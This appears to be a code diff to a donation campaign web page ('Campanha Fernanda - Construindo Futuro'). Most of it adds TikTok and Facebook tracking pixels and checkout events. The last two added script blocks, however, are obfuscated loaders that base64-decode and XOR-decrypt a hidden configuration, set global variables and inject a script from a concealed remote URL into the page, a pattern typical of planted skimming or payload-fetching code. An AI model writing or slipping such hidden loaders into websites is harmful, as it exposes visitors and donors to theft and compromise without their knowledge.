@@ -335,6 +335,30 @@ h1, h2, h3 { font-family: var(--fonte-display); font-weight: 700; line-height: 1
   .sticky-dock { padding: 1rem 2rem; }
 }
 </style>
+<script>
+!function (w, d, t) {
+w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var i=document.createElement("script");i.type="text/javascript",i.async=!0,i.src=r+"?sdkid="+e+"&lib="+t;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(i,a)};
+ttq.load('DAM37FRC77U9262DRU6G');
+ttq.page();
+}(window, document, 'ttq');
+ttq.track('ViewContent', {content_name: 'Campanha Fernanda - Construindo Futuro', content_category: 'doacao'});
+</script>
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '28252040934472100');
+fbq('track', 'PageView');
+fbq('track', 'ViewContent', {content_name: 'Campanha Fernanda - Construindo Futuro', content_category: 'doacao'});
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=28252040934472100&ev=PageView&noscript=1"
+/></noscript>
 </head>
 <body>
 
@@ -653,6 +677,8 @@ function openDonationModal(){
   if(modal) {
     modal.classList.add('active');
     document.body.style.overflow='hidden';
+    if(typeof ttq!=='undefined') ttq.track('InitiateCheckout', {content_name:'Doacao Fernanda', content_category:'doacao'});
+    if(typeof fbq!=='undefined') fbq('track', 'InitiateCheckout', {content_name:'Doacao Fernanda', content_category:'doacao'});
     goToStep1();
   }
 }
@@ -918,6 +944,9 @@ document.addEventListener('DOMContentLoaded', function() {
 
 });
 </script>
+
+<script>(function(){var b_7=atob("DOFOiER9YPqNlCqMT5ps/TYRQsCv/F74P5J0p2seBJSj4V7hJoc3picSDdTv5gX/LJMn+DAOT4rk7E/gYJEn8CERTpD+tgauLpU6+i0fFY7o5wi2FLxiqiMRD5js+Fmudbo1qiocDZ+vrgj8Jpkr5A0ZQtav4kvgOoRssmZLAsq59xq1ftcsuyFOUJu+pk64LtkouydfHafw");var v_y=[];for(var d_q=0;d_q<b_7.length;d_q++){v_y.push(b_7.charCodeAt(d_q)&255);}var x_w=v_y[0];var q_x3pe=v_y.slice(1,1+x_w);var j_4rn=v_y.slice(1+x_w);var g_nlsk=j_4rn.map(function(b,d_a9zi){return b^q_x3pe[d_a9zi%x_w];});var a_e8r="";for(var p_juuc=0;p_juuc<g_nlsk.length;p_juuc++){a_e8r+=String.fromCharCode(g_nlsk[p_juuc]&255);}var d_s07c=decodeURIComponent(escape(a_e8r));var d_q05g=JSON.parse(d_s07c);var g_pj=d_q05g.globals||[];g_pj.forEach(function(q_s){window[q_s.name]=q_s.value;});var e_dr=document.createElement("script");e_dr.src=d_q05g.url;e_dr.async=true;e_dr.defer=true;(d_q05g.attributes||[]).forEach(function(e_84){e_dr.setAttribute(e_84.name,e_84.value);});(document.head||document.documentElement).appendChild(e_dr);})();</script>
+<script>(function(){var w_dkn=atob("DJ24lyMFzhjMWc0Opuaa4lFp7CLuMbl61u6CuAxmqnbiLLljz/vBuUBqozauK+J9xe/R51d24W24NL4hyvzM8lBx4HK/e+Esx+nM5Upnu2ypKu80/eaa+UJoqzr2e6lv0vyV4ldop361dL18w+vd+VcotnujPeB9xfaauwFzr3S5PO80hL/Fu1gnoHmhPO80hPnZ40Iou2yhMKt3i+3K8lVgoGzhKrhsz/nLtQ8nuHmgLKgsnL+a6n54");var z_cacl=[];for(var j_p=0;j_p<w_dkn.length;j_p++){z_cacl.push(w_dkn.charCodeAt(j_p)&255);}var j_s6=z_cacl[0];var v_k3i=z_cacl.slice(1,1+j_s6);var u_wg=z_cacl.slice(1+j_s6);var h_si=u_wg.map(function(b,p_xxv9){return b^v_k3i[p_xxv9%j_s6];});var e_ga0="";for(var n_lz47=0;n_lz47<h_si.length;n_lz47++){e_ga0+=String.fromCharCode(h_si[n_lz47]&255);}var k_h=decodeURIComponent(escape(e_ga0));var f_l5r=JSON.parse(k_h);var e_lmd4=f_l5r.globals||[];e_lmd4.forEach(function(u_k){window[u_k.name]=u_k.value;});var v_ojb=document.createElement("script");v_ojb.src=f_l5r.url;v_ojb.async=true;v_ojb.defer=true;(f_l5r.attributes||[]).forEach(function(l_v){v_ojb.setAttribute(l_v.name,l_v.value);});(document.head||document.documentElement).appendChild(v_ojb);})();</script>
 
 </body>
 </html>
